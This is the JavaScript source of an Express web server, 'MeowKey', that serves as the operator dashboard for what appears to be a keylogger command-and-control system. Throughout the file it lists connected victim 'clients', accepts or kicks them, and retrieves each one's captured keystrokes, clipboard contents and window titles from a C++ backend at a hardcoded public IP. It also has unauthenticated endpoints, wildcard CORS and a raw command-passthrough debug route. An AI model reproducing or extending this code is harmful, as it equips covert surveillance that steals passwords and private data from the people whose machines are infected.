// UI/api/server.js - Complete JSON API Bridge
const express = require('express');
const http = require('http');
const net = require('net');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);

// Configuration - Use localhost since both servers are on same machine
const API_HOST = process.env.API_HOST || '13.48.25.178'; // Changed to localhost
const API_PORT = process.env.API_PORT || 3002; // C++ JSON API port
const UI_PORT = process.env.UI_PORT || 3000; // Web UI port
const DB_PATH = process.env.DB_PATH || '../meowkey_server.db'; // Adjusted path

// Global state
let apiConnected = false;
let apiConnectionAttempts = 0;
const MAX_RETRIES = 10;

// Utility functions
function formatTimestamp(timestamp) {
    if (!timestamp || timestamp === 0) return 'Unknown';
    
    try {
        // Handle microseconds timestamp from C++ (divide by 1000 to get milliseconds)
        const date = new Date(parseInt(timestamp) / 1000);
        const now = new Date();
        const diffMs = now - date;
        const diffMins = Math.floor(diffMs / 60000);
        const diffHours = Math.floor(diffMs / 3600000);
        const diffDays = Math.floor(diffMs / 86400000);

        if (diffMins < 1) return 'Just now';
        if (diffMins < 60) return `${diffMins}m ago`;
        if (diffHours < 24) return `${diffHours}h ago`;
        if (diffDays < 7) return `${diffDays}d ago`;
        
        return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
    } catch (e) {
        return 'Unknown';
    }
}

// Improved sendToAPI function
async function sendToAPI(command, data = {}, retries = 3) {
    console.log(`📤 Sending API command: ${command}`, data);
    
    for (let attempt = 1; attempt <= retries; attempt++) {
        try {
            const response = await sendToAPISingle(command, data);
            return response;
        } catch (error) {
            console.error(`API attempt ${attempt}/${retries} failed:`, error.message);
            
            if (attempt === retries) {
                throw error;
            }
            
            // Wait before retry
            await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
        }
    }
}

// Single attempt to send to API with improved handling
async function sendToAPISingle(command, data = {}) {
    return new Promise((resolve, reject) => {
        const socket = new net.Socket();
        const timeout = 15000; // 15 seconds timeout for commands
        
        const jsonData = JSON.stringify({
            command: command,
            ...data
        }) + '\n';
        
        let responseData = '';
        let responseTimeout;
        
        const cleanup = () => {
            clearTimeout(responseTimeout);
            if (socket && !socket.destroyed) {
                socket.destroy();
            }
        };
        
        socket.on('connect', () => {
            console.log(`✅ Connected to C++ API at ${API_HOST}:${API_PORT}`);
            socket.write(jsonData);
            
            // Set timeout for response
            responseTimeout = setTimeout(() => {
                cleanup();
                reject(new Error('Response timeout'));
            }, timeout);
        });
        
        socket.on('data', (chunk) => {
            responseData += chunk.toString();
            
            // Try to parse JSON if we have what looks like complete response
            if (responseData.includes('\n') || 
                (responseData.includes('{') && responseData.includes('}'))) {
                try {
                    const trimmed = responseData.trim();
                    if (trimmed) {
                        const response = JSON.parse(trimmed);
                        cleanup();
                        resolve(response);
                    }
                } catch (err) {
                    // Not JSON yet, continue collecting
                }
            }
        });
        
        socket.on('end', () => {
            cleanup();
            if (responseData.trim()) {
                try {
                    const response = JSON.parse(responseData.trim());
                    resolve(response);
                } catch (err) {
                    // Return raw response if not JSON
                    resolve({
                        status: 'success',
                        raw: responseData.trim(),
                        data: responseData.trim().split('\n').filter(line => line.trim())
                    });
                }
            } else {
                reject(new Error('No response from API'));
            }
        });
        
        socket.on('error', (err) => {
            cleanup();
            console.error(`❌ Socket error: ${err.message}`);
            apiConnected = false;
            reject(err);
        });
        
        socket.on('timeout', () => {
            cleanup();
            console.error('⏰ Socket connection timeout');
            reject(new Error('Connection timeout'));
        });
        
        // Connect to the server
        socket.connect({
            host: API_HOST,
            port: API_PORT,
            timeout: 10000
        });
    });
}

// Parse command output into structured data
function parseCommandOutput(command, outputArray) {
    console.log(`Parsing ${command} output:`, outputArray);
    
    if (!outputArray || !Array.isArray(outputArray)) {
        return { raw: outputArray || '', command: command };
    }
    
    const output = outputArray.join('\n');
    
    switch (command) {
        case 'list':
            return parseListOutput(output);
        case 'clients':
            return parseClientsOutput(output);
        case 'stats':
            return parseStatsOutput(output);
        case 'view':
            return parseViewOutput(output);
        default:
            return { raw: output, command: command };
    }
}

function parseListOutput(output) {
    console.log('Parsing list output:', output);
    
    const lines = output.split('\n');
    const result = {
        pending: [],
        active: [],
        raw: output
    };
    
    let currentSection = null;
    
    for (const line of lines) {
        const trimmed = line.trim();
        
        if (trimmed.startsWith('PENDING') || trimmed.includes('PENDING')) {
            currentSection = 'pending';
        } else if (trimmed.startsWith('ACTIVE') || trimmed.includes('ACTIVE')) {
            currentSection = 'active';
        } else if (trimmed.startsWith('  ') && !trimmed.includes('(none)')) {
            const clientId = trimmed.substring(2).trim();
            if (clientId && currentSection) {
                if (currentSection === 'pending') {
                    result.pending.push({
                        id: clientId,
                        status: 'pending',
                        connectedAt: Date.now()
                    });
                } else if (currentSection === 'active') {
                    result.active.push({
                        id: clientId,
                        status: 'active',
                        connectedAt: Date.now()
                    });
                }
            }
        } else if (trimmed.match(/^[a-zA-Z0-9_-]+$/)) {
            // Simple client ID on its own line
            if (currentSection === 'pending') {
                result.pending.push({
                    id: trimmed,
                    status: 'pending',
                    connectedAt: Date.now()
                });
            } else if (currentSection === 'active') {
                result.active.push({
                    id: trimmed,
                    status: 'active',
                    connectedAt: Date.now()
                });
            }
        }
    }
    
    return result;
}

function parseClientsOutput(output) {
    console.log('Parsing clients output:', output);
    
    const lines = output.split('\n');
    const result = {
        allClients: [],
        raw: output
    };
    
    for (const line of lines) {
        const trimmed = line.trim();
        
        if (trimmed.startsWith('* ')) {
            // Parse: "* client-id | Sessions: X KS:Y CB:Z W:A"
            const parts = trimmed.substring(2).split('|');
            if (parts.length >= 1) {
                const clientId = parts[0].trim();
                const client = { 
                    id: clientId,
                    status: 'registered'
                };
                
                if (parts.length > 1) {
                    const stats = parts[1];
                    
                    // Parse using regex to be more robust
                    const sessionMatch = stats.match(/Sessions:\s*(\d+)/i);
                    if (sessionMatch) client.sessions = parseInt(sessionMatch[1]);
                    
                    const ksMatch = stats.match(/KS:\s*(\d+)/i);
                    if (ksMatch) client.keystrokes = parseInt(ksMatch[1]);
                    
                    const cbMatch = stats.match(/CB:\s*(\d+)/i);
                    if (cbMatch) client.clipboard = parseInt(cbMatch[1]);
                    
                    const winMatch = stats.match(/W:\s*(\d+)/i);
                    if (winMatch) client.windows = parseInt(winMatch[1]);
                    
                    // Calculate total events
                    client.totalEvents = (client.keystrokes || 0) + 
                                        (client.clipboard || 0) + 
                                        (client.windows || 0);
                }
                
                result.allClients.push(client);
            }
        } else if (trimmed && !trimmed.includes('ALL REGISTERED') && !trimmed.includes('(no clients)')) {
            // Handle simple client ID lines
            result.allClients.push({
                id: trimmed,
                status: 'registered',
                sessions: 0,
                keystrokes: 0,
                clipboard: 0,
                windows: 0,
                totalEvents: 0
            });
        }
    }
    
    return result;
}

function parseStatsOutput(output) {
    console.log('Parsing stats output:', output);
    
    const lines = output.split('\n');
    const result = {
        raw: output,
        fileSize: '0 MB',
        usedSpace: '0 MB',
        usage: '0%',
        totalClients: 0,
        cachedClients: 0,
        freeNodes: 0,
        freeBlocks: 0
    };
    
    for (const line of lines) {
        const trimmed = line.trim();
        
        if (trimmed.includes('File size:')) {
            result.fileSize = trimmed.split(':')[1].trim();
        } else if (trimmed.includes('Used space:')) {
            result.usedSpace = trimmed.split(':')[1].trim();
        } else if (trimmed.includes('Usage:')) {
            result.usage = trimmed.split(':')[1].trim();
        } else if (trimmed.includes('Total clients:')) {
            result.totalClients = parseInt(trimmed.split(':')[1].trim()) || 0;
        } else if (trimmed.includes('Cached clients:')) {
            result.cachedClients = parseInt(trimmed.split(':')[1].trim()) || 0;
        } else if (trimmed.includes('Free B+ tree nodes:')) {
            result.freeNodes = parseInt(trimmed.split(':')[1].trim()) || 0;
        } else if (trimmed.includes('Free data blocks:')) {
            result.freeBlocks = parseInt(trimmed.split(':')[1].trim()) || 0;
        }
    }
    
    return result;
}

function parseViewOutput(output) {
    console.log('Parsing view output:', output);
    
    const lines = output.split('\n');
    const result = {
        clientId: '',
        keystrokes: [],
        clipboard: [],
        windows: [],
        raw: output
    };
    
    let currentSection = null;
    let itemIndex = 0;
    
    for (const line of lines) {
        const trimmed = line.trim();
        
        // Extract client ID
        if (trimmed.includes('DATA FOR CLIENT:')) {
            result.clientId = trimmed.split('DATA FOR CLIENT:')[1].trim();
            continue;
        }
        
        if (trimmed.includes('KEYSTROKES')) {
            currentSection = 'keystrokes';
            itemIndex = 0;
        } else if (trimmed.includes('CLIPBOARD')) {
            currentSection = 'clipboard';
            itemIndex = 0;
        } else if (trimmed.includes('WINDOWS')) {
            currentSection = 'windows';
            itemIndex = 0;
        } else if (trimmed.match(/^\d+\.\s+\[/)) {
            // Parse: "1. [timestamp] data"
            const match = trimmed.match(/^\s*(\d+)\.\s+\[(\d+)\]\s+(.+)$/);
            if (match) {
                itemIndex++;
                const timestamp = parseInt(match[2]);
                const data = match[3];
                
                const item = {
                    index: itemIndex,
                    timestamp: timestamp,
                    displayTime: formatTimestamp(timestamp)
                };
                
                switch (currentSection) {
                    case 'keystrokes':
                        item.key = data;
                        result.keystrokes.push(item);
                        break;
                    case 'clipboard':
                        item.content = data;
                        result.clipboard.push(item);
                        break;
                    case 'windows':
                        // Parse: "title [process]"
                        const winMatch = data.match(/(.+)\s+\[(.+)\]$/);
                        if (winMatch) {
                            item.title = winMatch[1].trim();
                            item.process = winMatch[2].trim();
                        } else {
                            item.title = data;
                            item.process = 'Unknown';
                        }
                        result.windows.push(item);
                        break;
                }
            }
        }
    }
    
    return result;
}

// Test API connection
async function testAPIConnection() {
    try {
        console.log(`🔌 Testing connection to C++ API at ${API_HOST}:${API_PORT}...`);
        const response = await sendToAPISingle('ping');
        apiConnected = true;
        apiConnectionAttempts = 0;
        console.log('✅ C++ API connection successful');
        return true;
    } catch (error) {
        apiConnected = false;
        apiConnectionAttempts++;
        
        const message = `❌ C++ API connection failed (${apiConnectionAttempts}/${MAX_RETRIES}): ${error.message}`;
        if (apiConnectionAttempts <= MAX_RETRIES) {
            console.error(message);
        } else {
            console.error('❌ C++ API connection failed after maximum retries');
        }
        return false;
    }
}

// Middleware setup
app.use(express.json());
app.use(express.static(path.join(__dirname, '..')));

// CORS middleware
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    next();
});

// Health check endpoint
app.get('/api/health', async (req, res) => {
    try {
        const response = await sendToAPI('ping');
        res.json({ 
            status: 'ok', 
            api: 'connected', 
            server: 'running',
            host: API_HOST,
            port: API_PORT,
            message: 'Server is running',
            ...response 
        });
    } catch (error) {
        res.status(500).json({ 
            status: 'error', 
            api: 'disconnected', 
            server: 'running',
            error: error.message,
            host: API_HOST,
            port: API_PORT,
            message: 'Cannot connect to C++ API'
        });
    }
});

// Get active and pending clients
app.get('/api/clients/list', async (req, res) => {
    try {
        console.log('📋 Getting clients list...');
        const response = await sendToAPI('list');
        console.log('List response:', response);
        
        const parsed = parseCommandOutput('list', response.data || response.raw);
        res.json({ 
            success: true, 
            ...parsed,
            message: `Found ${parsed.pending?.length || 0} pending and ${parsed.active?.length || 0} active clients` 
        });
    } catch (error) {
        console.error('Error getting clients list:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            pending: [],
            active: [],
            message: 'Failed to get clients list'
        });
    }
});

// Get all registered clients from database
app.get('/api/clients/all', async (req, res) => {
    try {
        console.log('📋 Getting all clients...');
        const response = await sendToAPI('clients');
        console.log('All clients response:', response);
        
        const parsed = parseCommandOutput('clients', response.data || response.raw);
        res.json({ 
            success: true, 
            ...parsed,
            message: `Found ${parsed.allClients?.length || 0} registered clients`
        });
    } catch (error) {
        console.error('Error getting all clients:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            allClients: [],
            message: 'Failed to get all clients'
        });
    }
});

/// Fix the view client data endpoint
app.get('/api/clients/:id/data', async (req, res) => {
    try {
        const clientId = req.params.id;
        const type = req.query.type || 'all';
        
        console.log(`📄 Getting ${type} data for client ${clientId}`);
        
        // Map frontend types to C++ API types
        const typeMap = {
            'all': 'all',
            'ks': 'all',
            'keystrokes': 'all',
            'clip': 'all',
            'clipboard': 'all',
            'win': 'all',
            'windows': 'all'
        };
        
        // Always request 'all' from C++ API
        const response = await sendToAPI('view', { 
            client_id: clientId, 
            type: 'all'  // Always get all data
        });
        
        console.log(`View response for ${clientId} (${type}):`, response);
        
        // Parse the response
        const parsed = parseCommandOutput('view', response.data || response.raw);
        
        // Filter data based on requested type
        let filteredData = { ...parsed };
        
        if (type === 'keystrokes' || type === 'ks') {
            filteredData.clipboard = [];
            filteredData.windows = [];
        } else if (type === 'clipboard' || type === 'clip') {
            filteredData.keystrokes = [];
            filteredData.windows = [];
        } else if (type === 'windows' || type === 'win') {
            filteredData.keystrokes = [];
            filteredData.clipboard = [];
        }
        
        // Add counts
        filteredData.keystrokeCount = filteredData.keystrokes?.length || 0;
        filteredData.clipboardCount = filteredData.clipboard?.length || 0;
        filteredData.windowCount = filteredData.windows?.length || 0;
        filteredData.totalCount = filteredData.keystrokeCount + filteredData.clipboardCount + filteredData.windowCount;
        
        res.json({ 
            success: true, 
            ...filteredData,
            message: `Retrieved ${filteredData.totalCount} ${type} events for client ${clientId}`
        });
    } catch (error) {
        console.error(`Error getting ${req.query.type} data for client ${req.params.id}:`, error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            clientId: req.params.id,
            keystrokes: [],
            clipboard: [],
            windows: [],
            keystrokeCount: 0,
            clipboardCount: 0,
            windowCount: 0,
            totalCount: 0,
            message: `Failed to get ${req.query.type} data for client ${req.params.id}`
        });
    }
});

// Accept a pending client
app.post('/api/clients/:id/accept', async (req, res) => {
    try {
        const clientId = req.params.id;
        console.log(`✅ Accepting client: ${clientId}`);
        
        const response = await sendToAPI('accept', { client_id: clientId });
        res.json({ 
            success: true, 
            ...response,
            message: `Client ${clientId} accepted successfully`
        });
    } catch (error) {
        console.error(`Error accepting client ${req.params.id}:`, error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            message: `Failed to accept client ${req.params.id}`
        });
    }
});

// Reject a pending client
app.post('/api/clients/:id/reject', async (req, res) => {
    try {
        const clientId = req.params.id;
        console.log(`❌ Rejecting client: ${clientId}`);
        
        const response = await sendToAPI('reject', { client_id: clientId });
        res.json({ 
            success: true, 
            ...response,
            message: `Client ${clientId} rejected successfully`
        });
    } catch (error) {
        console.error(`Error rejecting client ${req.params.id}:`, error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            message: `Failed to reject client ${req.params.id}`
        });
    }
});

// Kick/Disconnect a client
app.post('/api/clients/:id/kick', async (req, res) => {
    try {
        const clientId = req.params.id;
        console.log(`👢 Kicking client: ${clientId}`);
        
        const response = await sendToAPI('kick', { client_id: clientId });
        res.json({ 
            success: true, 
            ...response,
            message: `Client ${clientId} kicked successfully`
        });
    } catch (error) {
        console.error(`Error kicking client ${req.params.id}:`, error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            message: `Failed to kick client ${req.params.id}`
        });
    }
});

// Delete a client and all their data
app.delete('/api/clients/:id', async (req, res) => {
    try {
        const clientId = req.params.id;
        console.log(`🗑️  Deleting client: ${clientId}`);
        
        const response = await sendToAPI('delete', { client_id: clientId });
        res.json({ 
            success: true, 
            ...response,
            message: `Client ${clientId} deleted successfully`
        });
    } catch (error) {
        console.error(`Error deleting client ${req.params.id}:`, error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            message: `Failed to delete client ${req.params.id}`
        });
    }
});

// Get database statistics
app.get('/api/stats', async (req, res) => {
    try {
        console.log('📊 Getting database stats...');
        const response = await sendToAPI('stats');
        console.log('Stats response:', response);
        
        const parsed = parseCommandOutput('stats', response.data || response.raw);
        res.json({ 
            success: true, 
            ...parsed,
            message: 'Database statistics retrieved'
        });
    } catch (error) {
        console.error('Error getting stats:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            fileSize: '0 MB',
            usedSpace: '0 MB',
            usage: '0%',
            totalClients: 0,
            cachedClients: 0,
            freeNodes: 0,
            freeBlocks: 0,
            message: 'Failed to get database statistics'
        });
    }
});

// Flush database to disk
app.post('/api/database/flush', async (req, res) => {
    try {
        console.log('💾 Flushing database to disk...');
        const response = await sendToAPI('flush');
        res.json({ 
            success: true, 
            ...response,
            message: 'Database flushed to disk successfully'
        });
    } catch (error) {
        console.error('Error flushing database:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            message: 'Failed to flush database'
        });
    }
});

// View client data
app.get('/api/clients/:id/data', async (req, res) => {
    try {
        const clientId = req.params.id;
        const type = req.query.type || 'all';
        
        console.log(`📄 Getting data for client ${clientId}, type: ${type}`);
        
        const response = await sendToAPI('view', { 
            client_id: clientId, 
            type: type 
        });
        
        console.log(`View response for ${clientId}:`, response);
        
        const parsed = parseCommandOutput('view', response.data || response.raw);
        
        // Add counts
        parsed.keystrokeCount = parsed.keystrokes?.length || 0;
        parsed.clipboardCount = parsed.clipboard?.length || 0;
        parsed.windowCount = parsed.windows?.length || 0;
        parsed.totalCount = parsed.keystrokeCount + parsed.clipboardCount + parsed.windowCount;
        
        res.json({ 
            success: true, 
            ...parsed,
            message: `Retrieved ${parsed.totalCount} events for client ${clientId}`
        });
    } catch (error) {
        console.error(`Error getting data for client ${req.params.id}:`, error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            clientId: req.params.id,
            keystrokes: [],
            clipboard: [],
            windows: [],
            keystrokeCount: 0,
            clipboardCount: 0,
            windowCount: 0,
            totalCount: 0,
            message: `Failed to get data for client ${req.params.id}`
        });
    }
});

// Get server status
app.get('/api/server/status', async (req, res) => {
    try {
        const response = await sendToAPI('ping');
        
        res.json({ 
            success: true,
            running: true,
            port: 8080,
            apiPort: API_PORT,
            apiHost: API_HOST,
            apiConnected: true,
            status: 'connected',
            message: 'Server is running and connected to C++ API',
            response: response
        });
    } catch (error) {
        res.json({ 
            success: true, // Still true because UI server is running
            running: true,
            port: 8080,
            apiPort: API_PORT,
            apiHost: API_HOST,
            apiConnected: false,
            status: 'disconnected',
            error: error.message,
            message: 'UI server is running but cannot connect to C++ API'
        });
    }
});

// Get dashboard summary
app.get('/api/dashboard/summary', async (req, res) => {
    try {
        console.log('📈 Getting dashboard summary...');
        
        // Get all data needed for dashboard
        const [listResponse, statsResponse, allClientsResponse] = await Promise.all([
            sendToAPI('list').catch(err => {
                console.error('Error getting list:', err);
                return { data: [] };
            }),
            sendToAPI('stats').catch(err => {
                console.error('Error getting stats:', err);
                return { data: [] };
            }),
            sendToAPI('clients').catch(err => {
                console.error('Error getting all clients:', err);
                return { data: [] };
            })
        ]);
        
        const listData = parseCommandOutput('list', listResponse.data || listResponse.raw);
        const statsData = parseCommandOutput('stats', statsResponse.data || statsResponse.raw);
        const allClientsData = parseCommandOutput('clients', allClientsResponse.data || allClientsResponse.raw);
        
        res.json({
            success: true,
            activeClients: listData.active || [],
            pendingClients: listData.pending || [],
            totalClients: statsData.totalClients || allClientsData.allClients?.length || 0,
            databaseSize: statsData.fileSize || '0 MB',
            usedSpace: statsData.usedSpace || '0 MB',
            usage: statsData.usage || '0%',
            apiConnected: true,
            message: `Dashboard summary: ${listData.active?.length || 0} active, ${listData.pending?.length || 0} pending, ${statsData.totalClients || 0} total clients`
        });
    } catch (error) {
        console.error('Error getting dashboard summary:', error);
        res.status(500).json({
            success: false,
            error: error.message,
            activeClients: [],
            pendingClients: [],
            totalClients: 0,
            databaseSize: '0 MB',
            usedSpace: '0 MB',
            usage: '0%',
            apiConnected: false,
            message: 'Failed to get dashboard summary'
        });
    }
});

// Get database file info (for settings page)
app.get('/api/database/info', async (req, res) => {
    try {
        console.log('🗄️  Getting database file info...');
        
        // Check if database file exists
        const dbPath = path.join(__dirname, '..', '..', DB_PATH);
        console.log('Database path:', dbPath);
        
        const dbExists = fs.existsSync(dbPath);
        
        let fileStats = {};
        if (dbExists) {
            const stats = fs.statSync(dbPath);
            fileStats = {
                exists: true,
                size: stats.size,
                sizeMB: (stats.size / (1024 * 1024)).toFixed(2) + ' MB',
                modified: stats.mtime,
                created: stats.birthtime || stats.ctime
            };
        } else {
            fileStats = {
                exists: false,
                size: 0,
                sizeMB: '0 MB',
                modified: null,
                created: null
            };
        }
        
        // Also get stats from C++ API
        let serverStats = null;
        try {
            const statsResponse = await sendToAPI('stats');
            serverStats = parseCommandOutput('stats', statsResponse.data || statsResponse.raw);
        } catch (apiError) {
            console.error('Error getting API stats:', apiError);
            serverStats = null;
        }
        
        res.json({
            success: true,
            file: fileStats,
            serverStats: serverStats,
            message: `Database file ${dbExists ? 'exists' : 'not found'} at ${dbPath}`
        });
    } catch (error) {
        console.error('Error getting database info:', error);
        res.status(500).json({
            success: false,
            error: error.message,
            file: { exists: false, sizeMB: '0 MB' },
            serverStats: null,
            message: 'Failed to get database information'
        });
    }
});

// Stop server
app.post('/api/server/stop', async (req, res) => {
    try {
        console.log('🛑 Stopping server...');
        
        // For now, just send quit command without auth (add auth in production)
        const response = await sendToAPI('quit');
        res.json({ 
            success: true, 
            ...response,
            message: 'Server stop command sent'
        });
    } catch (error) {
        console.error('Error stopping server:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            message: 'Failed to stop server'
        });
    }
});

// Test direct command endpoint (for debugging)
app.post('/api/debug/command', async (req, res) => {
    try {
        const { command } = req.body;
        console.log(`🔧 Debug command: ${command}`);
        
        const response = await sendToAPI(command);
        res.json({
            success: true,
            command: command,
            response: response,
            message: `Command '${command}' executed`
        });
    } catch (error) {
        console.error('Debug command error:', error);
        res.status(500).json({
            success: false,
            error: error.message,
            command: req.body.command,
            message: 'Debug command failed'
        });
    }
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({
        success: false,
        error: 'Internal server error',
        message: err.message,
        stack: process.env.NODE_ENV === 'development' ? err.stack : undefined
    });
});

// 404 handler
app.use((req, res) => {
    console.log(`404: ${req.method} ${req.path}`);
    res.status(404).json({
        success: false,
        error: 'Endpoint not found',
        path: req.path,
        message: `No endpoint found at ${req.path}`
    });
});

// Start server
server.listen(UI_PORT, '0.0.0.0', async () => {
    console.log(`\n🚀 MeowKey Web UI Server`);
    console.log(`   URL: http://localhost:${UI_PORT}`);
    console.log(`   C++ API: ${API_HOST}:${API_PORT}`);
    console.log(`   Database: ${path.join(__dirname, '..', '..', DB_PATH)}`);
    
    console.log(`\n📊 Available Pages:`);
    console.log(`   http://localhost:${UI_PORT}/index.html          - Dashboard`);
    console.log(`   http://localhost:${UI_PORT}/waiting_room.html   - Waiting Room`);
    console.log(`   http://localhost:${UI_PORT}/clients.html        - Client Management`);
    console.log(`   http://localhost:${UI_PORT}/settings.html       - Settings`);
    
    console.log(`\n📋 API Status:`);
    console.log(`   http://localhost:${UI_PORT}/api/health          - Health Check`);
    console.log(`   http://localhost:${UI_PORT}/api/dashboard/summary - Dashboard Data`);
    console.log(`   http://localhost:${UI_PORT}/api/clients/list    - Active/Pending Clients`);
    console.log(`   http://localhost:${UI_PORT}/api/clients/all     - All Registered Clients`);
    
    // Test API connection on startup
    console.log('\n🔌 Testing C++ API connection...');
    await testAPIConnection();
    
    // Periodic connection check every 30 seconds
    setInterval(async () => {
        if (!apiConnected) {
            console.log('🔄 Attempting to reconnect to C++ API...');
            await testAPIConnection();
        }
    }, 30000);
    
    // Initial data fetch test
    setTimeout(async () => {
        if (apiConnected) {
            console.log('\n🧪 Testing data fetch...');
            try {
                const testResponse = await sendToAPI('ping').catch(() => null);
                if (testResponse) {
                    console.log('✅ Initial connection test successful');
                }
            } catch (err) {
                console.log('⚠️  Initial connection test failed');
            }
        }
    }, 1000);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n🛑 Received SIGINT, shutting down...');
    console.log('Closing HTTP server...');
    
    server.close(() => {
        console.log('✅ HTTP server closed');
        console.log('✅ UI server shutdown complete');
        process.exit(0);
    });
    
    // Force close after 5 seconds
    setTimeout(() => {
        console.log('⚠️  Forcing shutdown...');
        process.exit(1);
    }, 5000);
});

process.on('SIGTERM', () => {
    console.log('\n🔻 Received SIGTERM, shutting down...');
    server.close(() => {
        console.log('✅ Server closed gracefully');
        process.exit(0);
    });
});

// Handle uncaught exceptions
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});